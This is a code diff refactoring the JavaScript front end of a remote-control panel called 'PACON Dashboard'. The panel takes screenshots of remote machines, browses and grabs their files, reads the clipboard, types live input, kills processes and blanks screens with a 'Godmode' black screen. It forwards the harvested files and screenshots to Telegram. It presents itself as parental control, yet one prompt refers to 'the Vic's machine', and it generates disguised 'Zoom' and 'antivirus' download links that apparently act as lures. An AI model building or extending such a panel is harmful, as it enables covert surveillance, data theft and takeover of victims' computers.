 async function rcLoadApps(force = false) {
-    if (!currentDeviceId || appLoadInFlight) return;
-    if (force) currentAppList = [];
-    appLoadInFlight = true;
+    if (!state.currentDeviceId || state.appLoadInFlight) return;
+    if (force) state.appList = [];
+    state.appLoadInFlight = true;
+
     const drawer = document.getElementById('appDrawer');
-    const requestedDevice = currentDeviceId;
+    const requestedDevice = state.currentDeviceId;
     drawer.innerHTML = '<div class="app-empty"><div class="spinner-ring" style="margin: 0 auto; width: 24px; height: 24px;"></div></div>';
+
     try {
         const res = await api(`/api/apps/list?deviceId=${encodeURIComponent(requestedDevice)}`);
-        if (requestedDevice !== currentDeviceId) {
-            rcLog('Device changed during app fetch — discarding', 'warn');
-            appLoadInFlight = false;
+        if (requestedDevice !== state.currentDeviceId) {
+            state.appLoadInFlight = false;
             return;
         }
         let apps = [];
         if (Array.isArray(res)) apps = res;
         else if (res && Array.isArray(res.apps)) apps = res.apps;
-        currentAppList = apps;
-        renderApps();
+        state.appList = apps;
+        _renderApps();
         if (apps.length > 0) {
-            rcLog(`✅ Loaded ${apps.length} apps for ${requestedDevice.substring(0, 8)}`, 'success');
+            rcLog(`✅ Loaded ${apps.length} apps`, 'success');
         } else {
-            rcLog(`⚠️ Server returned 0 apps for device ${requestedDevice.substring(0, 8)}`, 'warn');
+            rcLog(`⚠️ Server returned 0 apps`, 'warn');
         }
     } catch (e) {
         rcLog('App load error: ' + e.message, 'error');
     } finally {
-        appLoadInFlight = false;
+        state.appLoadInFlight = false;
     }
 }
 
-function renderApps() {
+function _renderApps() {
     const drawer = document.getElementById('appDrawer');
-    let apps = currentAppList;
+    let apps = state.appList;
     const q = (document.getElementById('appSearch').value || '').toLowerCase().trim();
     if (q) {
         apps = apps.filter(a => {
@@ -2358,48 +2580,54 @@ function renderApps() {
         });
     }
     if (apps.length === 0) {
-        const ds = deviceState.get(currentDeviceId) || {};
+        const ds = deviceState.get(state.currentDeviceId) || {};
         const st = ds.status || 'offline';
-        drawer.innerHTML = `<div class="app-empty">
-            ${currentAppList.length === 0
+        drawer.innerHTML = `<div class="app-empty">${
+            state.appList.length === 0
                 ? (st === 'pending' ? 'Device is registering — apps will appear shortly.'
-                                    : 'No apps reported yet. Waiting for the agent…')
-                : 'No matching apps.'}
-        </div>`;
+                                    : 'No apps reported yet. Waiting for agent…')
+                : 'No matching apps.'
+        }</div>`;
         return;
     }
+
     apps.sort((a, b) => (a.label || a.name || '').localeCompare(b.label || b.name || ''));
-    drawer.innerHTML = apps.map(a => {
+    drawer.innerHTML = '';
+    apps.forEach(a => {
         const name = a.label || a.name || a.package || 'App';
         const pkg  = a.package || a.name || '';
-        const shortName = name.length > 12 ? name.substring(0, 12) + '…' : name;
-        const icon = appIconFor(name);
-        const dataPkg = encodeURIComponent(pkg);
-        return `
-            <div class="app-item"
-                 data-pkg="${dataPkg}"
-                 onclick="rcLaunchApp(decodeURIComponent(this.dataset.pkg))"
-                 title="${escapeHtml(name)}">
-                <div class="app-icon" style="background: ${icon.color}"><i class="${icon.icon}"></i></div>
-                <div class="app-name">${escapeHtml(shortName)}</div>
-            </div>
-        `;
-    }).join('');
+        const icon = _appIconFor(name);
+        const item = document.createElement('div');
+        item.className = 'app-item';
+        item.title = name;
+
+        const iconEl = document.createElement('div');
+        iconEl.className = 'app-icon';
+        iconEl.style.background = icon.color;
+        const iEl = document.createElement('i');
+        iEl.className = icon.icon;
+        iconEl.appendChild(iEl);
+
+        const nameEl = document.createElement('div');
+        nameEl.className = 'app-name';
+        nameEl.textContent = name.length > 12 ? name.substring(0, 12) + '…' : name;
+
+        item.appendChild(iconEl);
+        item.appendChild(nameEl);
+        item.addEventListener('click', () => rcLaunchApp(pkg));
+        drawer.appendChild(item);
+    });
 }
 
-function rcFilterApps() {
-    renderApps();
-}
-
-function appIconFor(name) {
+function _appIconFor(name) {
     name = (name || '').toLowerCase();
-    if (name.includes('chrome'))  return { icon: 'fab fa-chrome',    color: 'linear-gradient(135deg,#4285f4,#ea4335)' };
-    if (name.includes('edge'))    return { icon: 'fab fa-edge',      color: 'linear-gradient(135deg,#0078d4,#005a9e)' };
-    if (name.includes('firefox')) return { icon: 'fab fa-firefox',   color: 'linear-gradient(135deg,#ff7139,#e25822)' };
-    if (name.includes('brave'))   return { icon: 'fas fa-shield-alt',color: 'linear-gradient(135deg,#fb542b,#d64018)' };
-    if (name.includes('code'))    return { icon: 'fas fa-code',      color: 'linear-gradient(135deg,#0078d4,#005a9e)' };
-    if (name.includes('word'))    return { icon: 'fas fa-file-word', color: 'linear-gradient(135deg,#2b579a,#1e3f73)' };
-    if (name.includes('excel'))   return { icon: 'fas fa-file-excel',color: 'linear-gradient(135deg,#217346,#185c37)' };
+    if (name.includes('chrome'))   return { icon: 'fab fa-chrome', color: 'linear-gradient(135deg,#4285f4,#ea4335)' };
+    if (name.includes('edge'))     return { icon: 'fab fa-edge', color: 'linear-gradient(135deg,#0078d4,#005a9e)' };
+    if (name.includes('firefox'))  return { icon: 'fab fa-firefox', color: 'linear-gradient(135deg,#ff7139,#e25822)' };
+    if (name.includes('brave'))    return { icon: 'fas fa-shield-alt', color: 'linear-gradient(135deg,#fb542b,#d64018)' };
+    if (name.includes('code'))     return { icon: 'fas fa-code', color: 'linear-gradient(135deg,#0078d4,#005a9e)' };
+    if (name.includes('word'))     return { icon: 'fas fa-file-word', color: 'linear-gradient(135deg,#2b579a,#1e3f73)' };
+    if (name.includes('excel'))    return { icon: 'fas fa-file-excel', color: 'linear-gradient(135deg,#217346,#185c37)' };
     if (name.includes('powerpoint')) return { icon: 'fas fa-file-powerpoint', color: 'linear-gradient(135deg,#b7472a,#8b3720)' };
     if (name.includes('explorer') || name.includes('file')) return { icon: 'fas fa-folder', color: 'linear-gradient(135deg,#fbbc04,#f29900)' };
     if (name.includes('settings')) return { icon: 'fas fa-cog', color: 'linear-gradient(135deg,#5f6368,#3c4043)' };
@@ -2422,7 +2650,7 @@ function appIconFor(name) {
 }
 
 async function rcLaunchApp(packageName) {
-    if (!currentDeviceId || !packageName) return;
+    if (!state.currentDeviceId || !packageName) return;
     if (rcLaunchApp._inFlight) return;
     rcLaunchApp._inFlight = true;
     try {
@@ -2446,40 +2674,43 @@ async function rcLaunchApp(packageName) {
 // ============================================================
 async function rcUpdateAgentInfo() {
     const info = document.getElementById('agentInfo');
-    if (!currentDeviceId) {
+    if (!state.currentDeviceId) {
         info.innerHTML = '<div class="row"><span>Status:</span><span class="val">No device</span></div>';
         return;
     }
     const data = await api('/api/debug/devices');
     if (!data || !data.devices) return;
-    const d = data.devices[currentDeviceId];
+    const d = data.devices[state.currentDeviceId];
     if (!d) {
         info.innerHTML = '<div class="row"><span>Status:</span><span class="val">Not found</span></div>';
         return;
     }
     const lastPoll = d.last_poll_secs !== null && d.last_poll_secs !== undefined
         ? `${d.last_poll_secs}s ago` : 'never';
+
     let statusText, statusClass;
     if (d.online) { statusText = 'online'; statusClass = 'online'; }
     else if (!d.has_polled) { statusText = 'pending'; statusClass = 'pending'; }
     else { statusText = 'offline'; statusClass = 'offline'; }
+
     const sc = d.screen || {};
     info.innerHTML = `
         <div class="row"><span>Status:</span><span class="val ${statusClass}">${statusText}</span></div>
-        <div class="row"><span>PID:</span><span class="val">${d.agent_pid || '—'}</span></div>
+        <div class="row"><span>PID:</span><span class="val">${escapeHtml(String(d.agent_pid || '—'))}</span></div>
         <div class="row"><span>Version:</span><span class="val">${escapeHtml(d.agent_version || '—')}</span></div>
         <div class="row"><span>Last poll:</span><span class="val">${lastPoll}</span></div>
         <div class="row"><span>Apps:</span><span class="val">${d.app_count || 0}</span></div>
         <div class="row"><span>Screen:</span><span class="val">${sc.width || '?'}×${sc.height || '?'}</span></div>
-        <div class="row"><span>Origin:</span><span class="val">(${sc.origin_x||0},${sc.origin_y||0})</span></div>
+        <div class="row"><span>Origin:</span><span class="val">(${sc.origin_x || 0},${sc.origin_y || 0})</span></div>
         <div class="row"><span>Geo seq:</span><span class="val">${sc.geo_seq || 0}</span></div>
     `;
-    const ds = deviceState.get(currentDeviceId) || {};
+
+    const ds = deviceState.get(state.currentDeviceId) || {};
     ds.online = d.online;
-    ds.name = d.name;
+    ds.name   = d.name;
     ds.status = d.online ? 'online' : (!d.has_polled ? 'pending' : 'offline');
-    deviceState.set(currentDeviceId, ds);
-    updateStickyDevice(currentDeviceId);
+    deviceState.set(state.currentDeviceId, ds);
+    updateStickyDevice(state.currentDeviceId);
     updateActionButtons();
 }
 
@@ -2501,16 +2732,16 @@ async function rcShowDiagnostics() {
             lines.push(`  Hostname:   ${d.hostname || '?'}`);
             lines.push(`  Public IP:  ${d.public_ip || '?'}`);
             lines.push(`  Has polled: ${d.has_polled ? 'YES' : 'NO'}`);
-            lines.push(`  Status:     ${d.online ? 'ONLINE' : 'OFFLINE'} (last poll ${d.last_poll_secs}s ago)`);
+            lines.push(`  Status:     ${d.online ? 'ONLINE' : 'OFFLINE'} (${d.last_poll_secs}s ago)`);
             lines.push(`  Agent:      pid=${d.agent_pid} v=${d.agent_version}`);
             lines.push(`  Apps:       ${d.app_count}`);
             lines.push(`  Screen:     ${sc.width || '?'}×${sc.height || '?'} ` +
-                       `origin=(${sc.origin_x||0},${sc.origin_y||0}) seq=${sc.geo_seq||0}`);
+                       `origin=(${sc.origin_x || 0},${sc.origin_y || 0}) seq=${sc.geo_seq || 0}`);
             lines.push('');
         }
     }
     if (data.fingerprints && Object.keys(data.fingerprints).length > 0) {
-        lines.push('--- Fingerprints (hostname|ip → canonical ID) ---');
+        lines.push('--- Fingerprints ---');
         for (const [fp, cid] of Object.entries(data.fingerprints)) {
             lines.push(`  ${fp} → ${cid}`);
         }
@@ -2532,7 +2763,7 @@ function rcShowShortcuts() {
         'Ctrl+Scroll     Zoom in/out',
         'Alt+Left        Back key',
         'Alt+Home        Home key',
-        'Esc             Send Esc to remote'
+        'Esc             Send Esc to remote',
     ].join('\n'));
 }
 
@@ -2571,23 +2802,22 @@ async function tgSave() {
     const botToken = document.getElementById('tgBotToken').value.trim();
     const chatId   = document.getElementById('tgChatId').value.trim();
     if (!botToken || !chatId) {
-        rcLog('⚠️ Both bot token and chat ID required', 'warn');
         toast('Both bot token and chat ID required', 'warn');
         return;
     }
     const r = await api('/api/telegram/config', 'POST', {
-        bot_token: botToken, chat_id: chatId, enabled: true
+        bot_token: botToken, chat_id: chatId, enabled: true,
     });
     if (r && r.success) {
         rcLog('✅ Telegram config saved', 'success');
         toast('Telegram config saved', 'success');
         tgLoad();
         await api('/api/telegram/send-text', 'POST', {
-            text: '🛡️ <b>PACON Dashboard</b>\n\nYour Telegram integration is now active.'
+            text: '🛡️ <b>PACON Dashboard</b>\n\nYour Telegram integration is now active.',
         });
     } else {
-        rcLog('❌ Failed to save Telegram config', 'error');
-        toast('Failed to save Telegram config', 'error');
+        rcLog('❌ Save failed', 'error');
+        toast('Save failed', 'error');
     }
 }
 
@@ -2595,50 +2825,56 @@ async function tgSavePrefs() {
     const notifyOnline  = document.getElementById('tgNotifyOnline')?.checked  ?? true;
     const notifyOffline = document.getElementById('tgNotifyOffline')?.checked ?? true;
     const r = await api('/api/telegram/config', 'POST', {
-        notify_online:  notifyOnline,
-        notify_offline: notifyOffline,
+        notify_online: notifyOnline, notify_offline: notifyOffline,
     });
-    if (r && r.success) {
-        rcLog(`✅ Prefs saved`, 'success');
-    } else {
-        rcLog('❌ Failed to save prefs', 'error');
-    }
+    if (r && r.success) rcLog('✅ Prefs saved', 'success');
+    else rcLog('❌ Failed to save prefs', 'error');
 }
 
 async function tgTest() {
     const r = await api('/api/telegram/test', 'POST');
-    if (r && r.success) { rcLog('✅ Test message sent to Telegram', 'success'); toast('Telegram test sent', 'success'); }
-    else { rcLog('❌ Telegram test failed: ' + (r?.error || 'unknown'), 'error'); toast('Telegram test failed', 'error'); }
+    if (r && r.success) {
+        rcLog('✅ Test message sent', 'success');
+        toast('Telegram test sent', 'success');
+    } else {
+        rcLog('❌ Test failed: ' + (r?.error || 'unknown'), 'error');
+        toast('Test failed', 'error');
+    }
 }
 
 async function tgSendLatestScreenshot() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
-    const shots = await api('/api/screenshots?limit=10&deviceId=' + encodeURIComponent(currentDeviceId));
+    if (!state.currentDeviceId) { toast('Select a device', 'warn'); return; }
+    const shots = await api('/api/screenshots?limit=10&deviceId=' + encodeURIComponent(state.currentDeviceId));
     if (!Array.isArray(shots) || shots.length === 0) {
         rcLog('⚠️ No screenshots available', 'warn');
         return;
     }
     const latest = shots[0];
-    rcLog(`📤 Sending ${latest.filename}...`, 'info');
-    const r = await api(`/api/telegram/send-screenshot/${encodeURIComponent(latest.filename)}?deviceId=${encodeURIComponent(currentDeviceId)}`, 'POST');
-    if (r && r.success) { rcLog('✅ Screenshot sent', 'success'); toast('Screenshot sent to Telegram', 'success'); }
-    else { rcLog('❌ Send failed: ' + (r?.error || 'unknown'), 'error'); toast('Send failed', 'error'); }
-}
-
-async function tgSendApps() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
-    rcLog('📤 Sending apps list...', 'info');
-    const r = await api('/api/telegram/send-apps', 'POST', { deviceId: currentDeviceId });
-    if (r && r.success) { rcLog('✅ Apps list sent', 'success'); toast('Apps list sent', 'success'); }
-    else { rcLog('❌ Send failed: ' + (r?.error || 'unknown'), 'error'); toast('Send failed', 'error'); }
+    rcLog(`📤 Sending ${latest.filename}…`, 'info');
+    const r = await api(
+        `/api/telegram/send-screenshot/${encodeURIComponent(latest.filename)}?deviceId=${encodeURIComponent(state.currentDeviceId)}`,
+        'POST'
+    );
+    if (r && r.success) {
+        rcLog('✅ Screenshot sent', 'success');
+        toast('Screenshot sent', 'success');
+    } else {
+        rcLog('❌ Send failed: ' + (r?.error || 'unknown'), 'error');
+        toast('Send failed', 'error');
+    }
 }
 
 async function tgSendCustomText() {
     const text = prompt('Message to send via Telegram:');
     if (!text) return;
     const r = await api('/api/telegram/send-text', 'POST', { text });
-    if (r && r.success) { rcLog('✅ Message sent', 'success'); toast('Message sent', 'success'); }
-    else { rcLog('❌ Send failed', 'error'); toast('Send failed', 'error'); }
+    if (r && r.success) {
+        rcLog('✅ Message sent', 'success');
+        toast('Message sent', 'success');
+    } else {
+        rcLog('❌ Send failed', 'error');
+        toast('Send failed', 'error');
+    }
 }
 
 async function tgListAdminFiles() {
@@ -2655,11 +2891,8 @@ async function tgListAdminFiles() {
         toast('No admin-uploaded files', 'warn');
         return;
     }
-    const names = adminFiles.map((f, i) => `${i+1}. ${f.name} (${f.size_formatted || ''})`).join('\n');
-    const choice = prompt(
-        `Server files (${adminFiles.length}):\n\n${names}\n\nEnter # to send:`,
-        '1'
-    );
+    const names = adminFiles.map((f, i) => `${i + 1}. ${f.name} (${f.size_formatted || ''})`).join('\n');
+    const choice = prompt(`Server files (${adminFiles.length}):\n\n${names}\n\nEnter # to send:`, '1');
     if (!choice) return;
     const idx = parseInt(choice) - 1;
     if (isNaN(idx) || idx < 0 || idx >= adminFiles.length) {
@@ -2671,8 +2904,8 @@ async function tgListAdminFiles() {
 
 async function tgPickAndSendAdminFile() {
     const name = prompt(
-        'Filename to send from server\'s FILES_DIR:\n' +
-        '(e.g. report.pdf — must already exist on the server)'
+        "Filename to send from server's FILES_DIR:\n" +
+        "(e.g. report.pdf — must already exist on the server)"
     );
     if (!name) return;
     await tgSendServerFile(name.trim());
@@ -2680,12 +2913,12 @@ async function tgPickAndSendAdminFile() {
 
 async function tgSendServerFile(filename) {
     rcLog(`📤 Sending ${filename} → Telegram…`, 'info');
-    const url = `/api/telegram/send-file/${encodeURIComponent(filename)}?source=files`
-              + (currentDeviceId ? `&deviceId=${encodeURIComponent(currentDeviceId)}` : '');
+    const url = `/api/telegram/send-file/${encodeURIComponent(filename)}?source=files` +
+                (state.currentDeviceId ? `&deviceId=${encodeURIComponent(state.currentDeviceId)}` : '');
     const r = await api(url, 'POST');
     if (r && r.success) {
-        rcLog(`✅ ${filename} sent to Telegram`, 'success');
-        toast(`${filename} sent to Telegram`, 'success');
+        rcLog(`✅ ${filename} sent`, 'success');
+        toast(`${filename} sent`, 'success');
     } else {
         rcLog('❌ Send failed: ' + ((r && r.error) || 'unknown'), 'error');
         toast('Send failed: ' + ((r && r.error) || 'unknown'), 'error');
@@ -2693,30 +2926,30 @@ async function tgSendServerFile(filename) {
 }
 
 async function tgPickAndSendReceivedFile() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
+    if (!state.currentDeviceId) { toast('Select a device', 'warn'); return; }
     await rcLoadReceivedFiles(true);
-    if (!receivedFiles.length) {
+    if (!state.receivedFiles.length) {
         toast('No received files yet', 'warn');
         return;
     }
-    const names = receivedFiles.map((f, i) =>
-        `${i+1}. ${f.filename} (${formatBytes(f.size)})`).join('\n');
+    const names = state.receivedFiles.map((f, i) =>
+        `${i + 1}. ${f.filename} (${formatBytes(f.size)})`).join('\n');
     const choice = prompt(
-        `Received files (${receivedFiles.length}):\n\n${names}\n\nEnter # to send:`,
+        `Received files (${state.receivedFiles.length}):\n\n${names}\n\nEnter # to send:`,
         '1'
     );
     if (!choice) return;
     const idx = parseInt(choice) - 1;
-    if (isNaN(idx) || idx < 0 || idx >= receivedFiles.length) {
+    if (isNaN(idx) || idx < 0 || idx >= state.receivedFiles.length) {
         toast('Invalid selection', 'warn');
         return;
     }
-    const f = receivedFiles[idx];
+    const f = state.receivedFiles[idx];
     await rcTelegramReceived(f.dev_folder, f.filename);
 }
 
 async function tgGrabAndSendFromChild() {
-    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
+    if (!state.currentDeviceId) { toast('Select a device', 'warn'); return; }
     const path = prompt(
         "Absolute path on the Vic's machine to grab & send:\n" +
         "Example: C:\\Users\\Kid\\Desktop\\homework.pdf"
@@ -2739,124 +2972,307 @@ async function tgGrabAndSendFromChild() {
 
     const match = await _waitForReceivedFile(base, 8000);
     if (!match) {
-        rcLog('⚠️ Fetched file not indexed yet — try "Received" button', 'warn');
+        rcLog('⚠️ Fetched file not indexed yet — try "Received"', 'warn');
         toast('File fetched but not indexed — try "Received"', 'warn');
         return;
     }
-
     rcLog(`📤 Sending ${match.filename} → Telegram…`, 'info');
     await rcTelegramReceived(match.dev_folder, match.filename);
 }
 
 // ============================================================
-// HELPERS
+// EVENT WIRING — all buttons connected here, no inline onclick
 // ============================================================
-function escapeHtml(s) {
-    return String(s ?? '')
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;')
-        .replace(/'/g, '&#39;');
+function wireEventHandlers() {
+    // --- Header ---
+    document.getElementById('btnRefreshDevices').addEventListener('click', rcRefreshDevices);
+    document.getElementById('btnToggleAuto').addEventListener('click', rcToggleAutoRefresh);
+    document.getElementById('btnForceShot').addEventListener('click', rcForceScreenshot);
+    document.getElementById('btnLiveTyping').addEventListener('click', rcToggleLiveTyping);
+    document.getElementById('btnDiagnostics').addEventListener('click', rcShowDiagnostics);
+    document.getElementById('btnLogout').addEventListener('click', rcLogout);
+
+    // --- Device select / cards ---
+    document.getElementById('deviceSelect').addEventListener('change', (e) => {
+        const id = e.target.value;
+        if (id) rcSelectDevice(id);
+    });
+
+    document.getElementById('deviceList').addEventListener('click', (e) => {
+        const copyEl = e.target.closest('[data-copy-id]');
+        if (copyEl) {
+            e.stopPropagation();
+            const id = copyEl.dataset.copyId;
+            if (id) {
+                navigator.clipboard.writeText(id).then(
+                    () => toast('Device ID copied', 'success', 1500),
+                    () => toast('Copy failed', 'warn', 1500)
+                );
+            }
+            return;
+        }
+        const card = e.target.closest('.device-card');
+        if (card && card.dataset.deviceId) {
+            rcSelectDevice(card.dataset.deviceId);
+        }
+    });
+
+    // --- Left sidebar quick actions ---
+    document.querySelectorAll('.menu-item[data-action]').forEach(el => {
+        el.addEventListener('click', () => {
+            if (el.classList.contains('disabled')) return;
+            rcKey(el.dataset.action);
+        });
+    });
+
+    document.getElementById('miRefresh').addEventListener('click', rcRefreshScreen);
+    document.getElementById('miClearLog').addEventListener('click', rcClearLog);
+    document.getElementById('miShortcuts').addEventListener('click', rcShowShortcuts);
+    document.getElementById('miLock').addEventListener('click', rcLogout);
+
+    // --- Zoom controls ---
+    document.getElementById('btnZoomOut').addEventListener('click', () => rcZoom(-1));
+    document.getElementById('btnZoomReset').addEventListener('click', () => rcZoom(0));
+    document.getElementById('btnZoomIn').addEventListener('click', () => rcZoom(1));
+
+    // --- Godmode: black screen ---
+    document.getElementById('btnBlackscreen').addEventListener('click', rcDeployBlackscreen);
+    document.getElementById('btnUnblackscreen').addEventListener('click', rcLiftBlackscreen);
+
+    // --- Key buttons ---
+    document.querySelectorAll('[data-cmd="key"]').forEach(btn => {
+        btn.addEventListener('click', () => rcKey(btn.dataset.key));
+    });
+
+    // --- Hotkey buttons ---
+    document.querySelectorAll('[data-hotkey]').forEach(btn => {
+        btn.addEventListener('click', () => rcHotkey(btn.dataset.hotkey));
+    });
+
+    // --- Text input ---
+    document.getElementById('btnSendText').addEventListener('click', rcSendText);
+    document.getElementById('rcTextInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            rcSendText();
+        }
+    });
+    document.getElementById('btnClearText').addEventListener('click', rcClearText);
+
+    // --- Power / clipboard / kill ---
+    document.getElementById('btnClipGet').addEventListener('click', rcClipboardGet);
+    document.getElementById('btnClipSet').addEventListener('click', rcClipboardSet);
+    document.querySelectorAll('[data-power]').forEach(btn => {
+        btn.addEventListener('click', () => rcPower(btn.dataset.power));
+    });
+    document.getElementById('btnKill').addEventListener('click', rcKillProcess);
+    document.getElementById('rcKillInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            rcKillProcess();
+        }
+    });
+
+    // --- Link generators ---
+    document.getElementById('btnZoomLink').addEventListener('click', () => {
+        _showLink('Zoom call link', PARENT_LINKS.zoom);
+        toast('Zoom link generated & copied', 'success', 2500);
+    });
+    document.getElementById('btnAvLink').addEventListener('click', () => {
+        _showLink('Antivirus download link', PARENT_LINKS.antivirus);
+        toast('Antivirus link generated & copied', 'success', 2500);
+    });
+    document.getElementById('btnCopyLink').addEventListener('click', () => _copyLink(false));
+    document.getElementById('btnOpenLink').addEventListener('click', _openLink);
+    document.getElementById('btnSendLinkTg').addEventListener('click', _sendLinkTg);
+    document.getElementById('btnHideLink').addEventListener('click', () => {
+        document.getElementById('rcLinkOutput').style.display = 'none';
+    });
+
+    // --- File browser ---
+    document.querySelectorAll('[data-quickpath]').forEach(btn => {
+        btn.addEventListener('click', () => rcQuickPath(btn.dataset.quickpath));
+    });
+    document.getElementById('rcHiddenToggle').addEventListener('click', rcToggleHidden);
+    document.getElementById('rcFileUp').addEventListener('click', rcFileUp);
+    document.getElementById('rcListDirBtn').addEventListener('click', rcListDir);
+    document.getElementById('rcPathInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            rcListDir();
+        } else if (e.ctrlKey && e.key.toLowerCase() === 'l') {
+            e.preventDefault();
+            e.target.select();
+        }
+    });
+    document.getElementById('btnFetchFolderTg').addEventListener('click', rcFetchFolderAndTg);
+
+    // --- Received files ---
+    document.getElementById('btnRefreshReceived').addEventListener('click', () => rcLoadReceivedFiles(true));
+    document.getElementById('btnFetchFilePrompt').addEventListener('click', rcFetchFilePrompt);
+    document.getElementById('btnFetchFolderPrompt').addEventListener('click', rcFetchFolderPrompt);
+    document.getElementById('btnSendAllReceivedTg').addEventListener('click', rcSendAllReceivedTg);
+
+    // --- Apps ---
+    document.getElementById('btnRefreshApps').addEventListener('click', () => rcLoadApps(true));
+    document.getElementById('appSearch').addEventListener('input', debounce(_renderApps, 100));
+
+    // --- Telegram ---
+    document.getElementById('btnTgSave').addEventListener('click', tgSave);
+    document.getElementById('btnTgTest').addEventListener('click', tgTest);
+    document.getElementById('tgNotifyOnline').addEventListener('change', tgSavePrefs);
+    document.getElementById('tgNotifyOffline').addEventListener('change', tgSavePrefs);
+    document.getElementById('btnTgServerFiles').addEventListener('click', tgListAdminFiles);
+    document.getElementById('btnTgPickAdmin').addEventListener('click', tgPickAndSendAdminFile);
+    document.getElementById('btnTgAllReceived').addEventListener('click', rcSendAllReceivedTg);
+    document.getElementById('btnTgPickReceived').addEventListener('click', tgPickAndSendReceivedFile);
+    document.getElementById('btnTgGrabChild').addEventListener('click', tgGrabAndSendFromChild);
+    document.getElementById('btnTgCustom').addEventListener('click', tgSendCustomText);
+
+    // --- Stream quality ---
+    document.getElementById('streamQuality').addEventListener('change', (e) => {
+        rcSetQuality(e.target.value);
+    });
+
+    // --- Log toggle ---
+    document.getElementById('logToggle').addEventListener('click', () => {
+        document.getElementById('rcLog').classList.toggle('collapsed');
+    });
+
+    // --- Global keyboard shortcuts ---
+    document.addEventListener('keydown', (e) => {
+        const tag = e.target.tagName;
+        if (tag === 'INPUT' || tag === 'TEXTAREA') return;
+        if (e.ctrlKey && e.shiftKey) {
+            const k = e.key.toUpperCase();
+            if (k === 'S') { e.preventDefault(); rcForceScreenshot(); return; }
+            if (k === 'R') { e.preventDefault(); rcRefreshScreen(); return; }
+            if (k === 'T') { e.preventDefault(); tgSendLatestScreenshot(); return; }
+            if (k === 'F') { e.preventDefault(); rcFetchFilePrompt(); return; }
+            if (k === 'D') { e.preventDefault(); rcShowDiagnostics(); return; }
+        }
+        if (e.altKey && e.key === 'ArrowLeft') { e.preventDefault(); rcKey('back'); }
+        if (e.altKey && e.key === 'Home')      { e.preventDefault(); rcKey('home'); }
+        if (e.key === 'Escape' && !state.liveTyping) { e.preventDefault(); rcHotkey('esc'); }
+    });
+
+    // --- Resize → reposition overlay ---
+    const reposition = () => {
+        const img = document.getElementById('screenImg');
+        const overlay = document.getElementById('screenOverlay');
+        if (img && overlay && img.src) _repositionOverlay(img, overlay);
+    };
+    window.addEventListener('resize', debounce(reposition, 100));
+
+    // --- Live typing flush on unload ---
+    window.addEventListener('beforeunload', () => {
+        if (state.liveTyping) rcLiveFlush();
+    });
 }
 
 // ============================================================
-// BOOT
+// STATUS POLL LOOP
 // ============================================================
-function rcBootAfterAuth() {
-    setupScreenInteraction();
-    rcRefreshDevices();
-    setInterval(rcRefreshDevices, 5000);
-    rcSetRefreshInterval(currentRefreshInterval);
-    tgLoad();
-
-    const qSelect = document.getElementById('streamQuality');
-    if (qSelect) qSelect.value = String(currentRefreshInterval);
-
-    if (showHiddenFiles) {
-        document.getElementById('rcHiddenToggle').classList.add('active');
-        document.getElementById('rcHiddenToggle').querySelector('i').className = 'fas fa-eye';
-    }
-
+function startStatusLoop() {
     setInterval(async () => {
-        if (!currentDeviceId) return;
+        if (!state.currentDeviceId) return;
         const data = await api('/api/devices');
         if (!data || !data.devices) return;
-        const d = data.devices[currentDeviceId];
+        const d = data.devices[state.currentDeviceId];
+
+        const pill = document.getElementById('statusPill');
+        const text = document.getElementById('statusText');
+
         if (!d) {
-            const statusText = document.getElementById('statusText');
-            const pill = document.getElementById('statusPill');
             pill.classList.remove('pending');
             pill.classList.add('offline');
-            statusText.textContent = 'Device gone';
-            const ds = deviceState.get(currentDeviceId) || {};
+            text.textContent = 'Device gone';
+            const ds = deviceState.get(state.currentDeviceId) || {};
             ds.status = 'offline';
             ds.online = false;
-            deviceState.set(currentDeviceId, ds);
-            updateStickyDevice(currentDeviceId);
+            deviceState.set(state.currentDeviceId, ds);
+            updateStickyDevice(state.currentDeviceId);
             updateActionButtons();
             return;
         }
+
         const st = d.pending ? 'pending' : (d.online ? 'online' : 'offline');
-        const statusText = document.getElementById('statusText');
-        const pill = document.getElementById('statusPill');
         pill.classList.remove('offline', 'pending');
 
         if (st === 'online') {
-            statusText.textContent = 'Connected';
+            text.textContent = 'Connected';
         } else if (st === 'pending') {
             pill.classList.add('pending');
-            statusText.textContent = 'Registering…';
+            text.textContent = 'Registering…';
         } else {
             pill.classList.add('offline');
             const lastSeenMs = d.last_seen
                 ? (Date.now() - new Date(d.last_seen).getTime())
                 : Infinity;
-            statusText.textContent = isFinite(lastSeenMs)
+            text.textContent = isFinite(lastSeenMs)
                 ? `Offline ${Math.floor(lastSeenMs / 1000)}s`
                 : 'Offline';
         }
 
-        const ds = deviceState.get(currentDeviceId) || {};
+        const ds = deviceState.get(state.currentDeviceId) || {};
         ds.online = !!d.online;
         ds.status = st;
-        ds.name = d.name;
-        deviceState.set(currentDeviceId, ds);
-        updateStickyDevice(currentDeviceId);
+        ds.name   = d.name;
+        deviceState.set(state.currentDeviceId, ds);
+        updateStickyDevice(state.currentDeviceId);
         updateActionButtons();
 
+        // Refresh agent info every ~10s
         const now = Date.now();
-        if (now - lastStatusPoll > 10000) {
-            lastStatusPoll = now;
+        if (now - state.lastStatusPoll > 10000) {
+            state.lastStatusPoll = now;
             rcUpdateAgentInfo();
         }
     }, 3000);
-
-    document.getElementById('rcTextInput').addEventListener('keydown', (e) => {
-        if (e.key === 'Enter') rcSendText();
-    });
-
-    document.getElementById('rcPathInput').addEventListener('keydown', (e) => {
-        if (e.ctrlKey && e.key === 'l') {
-            e.preventDefault();
-            document.getElementById('rcPathInput').select();
-        }
-    });
-
-    document.addEventListener('keydown', (e) => {
-        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
-        if (e.ctrlKey && e.shiftKey && e.key === 'S') { e.preventDefault(); rcForceScreenshot(); }
-        if (e.ctrlKey && e.shiftKey && e.key === 'R') { e.preventDefault(); rcRefreshScreen(); }
-        if (e.ctrlKey && e.shiftKey && e.key === 'T') { e.preventDefault(); tgSendLatestScreenshot(); }
